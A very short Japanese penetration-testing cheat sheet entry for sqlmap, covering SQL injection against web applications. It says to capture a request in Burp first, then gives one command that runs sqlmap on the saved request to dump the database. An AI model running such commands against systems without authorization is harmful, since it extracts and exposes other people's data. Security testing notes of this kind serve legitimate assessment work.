# sqlmap

## Webアプリ上のSQLI

※事前にBurpでリクエストとレスポンスをキャプチャしておく。

```
sqlmap -r req.txt --dbms={mysql/Z} --dump
```
